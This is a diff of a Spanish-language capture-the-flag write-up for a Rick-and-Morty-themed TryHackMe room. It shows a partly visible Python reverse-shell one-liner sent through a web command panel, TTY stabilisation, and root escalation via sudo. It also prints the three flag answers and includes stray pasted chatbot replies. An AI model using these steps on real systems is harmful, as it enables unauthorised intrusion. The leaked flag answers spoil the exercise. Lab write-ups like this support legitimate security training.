@@ -79,7 +79,7 @@ Al introducir estas credenciales, logré acceder al sistema, lo que marca el fin
 
 -----
 
-### 💥 Fase 2: Explotación y Acceso Inicial
+## 💥 Fase 2: Explotación y Acceso Inicial
 
 Una vez con las credenciales, inicié sesión en la página **`/login.php`** y fui redirigido a una nueva sección: **`portal.php`**. Esta página presentaba un "Panel de Comandos" con un campo de texto para ejecutar comandos.
 
@@ -105,3 +105,99 @@ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SO
 ![alt](images/4.png)
 Después de ejecutar el comando, recibí una conexión en mi *listener* de `netcat`, lo que me dio una *shell* con el usuario **`www-data`**. Ahora, el objetivo es encontrar los tres ingredientes y, finalmente, escalar privilegios para obtener el control total.
 ![alt](images/5.png)
+
+---
+
+## 🔎 Fase 3: Post-Explotación y Enumeración del Sistema
+
+Una vez que obtuvimos la *shell* inicial, lo siguiente es estabilizarla. La *shell* de `netcat` es muy básica y carece de funcionalidades importantes como la autocompletación o el historial de comandos. Para mejorar la experiencia, haremos un tratamiento de **TTY** (TeleTypewriter).
+
+Para lograr una **TTY** estable, seguí estos pasos en orden:
+
+  * Ejecuté el siguiente comando para generar una *shell* de bash:
+
+    ```bash
+    script /dev/null -c bash
+    ```
+
+  * Luego, presioné `Ctrl + Z` para suspender el proceso.
+
+  * A continuación, en mi máquina atacante, ejecuté este comando para manejar las opciones del terminal:
+
+    ```bash
+    stty raw -echo; fg
+    ```
+
+  * Después de esto, escribí el comando `reset xterm`, aunque no fuera visible en la pantalla.
+
+  * Finalmente, terminé de configurar las variables del entorno para una *shell* completamente funcional:
+
+    ```bash
+    export TERM=xterm
+    export SHELL=bash
+    ```
+
+Con estos pasos, la *shell* quedó completamente interactiva y estable, lo que nos permitió empezar la fase de post-explotación para enumerar el sistema y buscar los tres ingredientes.
+
+No hay problema. Aquí tienes el texto ajustado con el contenido del archivo, listo para que lo uses en tu *write-up*.
+
+-----
+
+### 🧪 Ingrediente 1: El Archivo Secreto
+
+Una vez que la *shell* estuvo estabilizada, el primer paso fue enumerar el sistema de archivos para buscar pistas. Al ejecutar el comando **`ls -la`**, se listaron los archivos en el directorio actual.
+
+```bash
+ls -la
+```
+
+Entre los archivos, encontramos uno con un nombre bastante sospechoso: **`Sup3rS3cretPickl3Ingred.txt`**. ¡Este parecía ser el primer ingrediente\!
+
+Para ver su contenido, utilicé el comando **`cat`**:
+
+```bash
+cat Sup3rS3cretPickl3Ingred.txt
+```
+
+El contenido del archivo era **`mr. meeseek hair`**, el cual fue validado exitosamente en la plataforma de **TryHackMe**.
+Aquí tienes la versión completa, incluyendo la validación en TryHackMe.
+
+-----
+
+### 🧪 Ingrediente 2: El Directorio de Rick
+
+Para encontrar el segundo ingrediente, el siguiente paso fue buscar en el directorio de usuario de Rick. Me dirigí a la ruta **`/home/rick`** y, al ejecutar un comando `ls`, encontré el archivo que estaba buscando: `second ingredients`.
+
+```bash
+cd /home/rick
+ls -la
+```
+
+Al igual que con el primer ingrediente, usé el comando `cat` para ver el contenido del archivo.
+
+```bash
+cat "second ingredients"
+```
+
+El contenido del archivo era **`1 jerry tear`**, lo que me proporcionó el segundo ingrediente necesario y fue validado exitosamente en la plataforma de **TryHackme**.
+
+-----
+
+### 🧪 Ingrediente 3: El Directorio de Root
+
+El último paso para encontrar el tercer ingrediente fue escalar privilegios. Utilicé el comando `sudo -l` para verificar qué comandos podía ejecutar el usuario `www-data` como superusuario. La salida del comando mostró una configuración crucial: `(ALL) NOPASSWD: ALL`. Esto significa que el usuario **`www-data`** puede ejecutar **cualquier comando** como **cualquier usuario** sin necesidad de una contraseña.
+![alt](images/6.png)
+Aprovechando esta configuración, escalé privilegios al usuario **`root`** con el siguiente comando:
+
+```bash
+sudo su
+```
+
+Una vez con permisos de root, me dirigí al directorio **`/root`**, donde encontré un archivo llamado **`3rd.txt`**.
+
+```bash
+cd /root
+ls -la
+```
+
+Al igual que con los ingredientes anteriores, usé el comando `cat` para ver su contenido. El contenido del archivo era **`fleeb juice`**, lo que me proporcionó el tercer y último ingrediente necesario para completar la máquina.
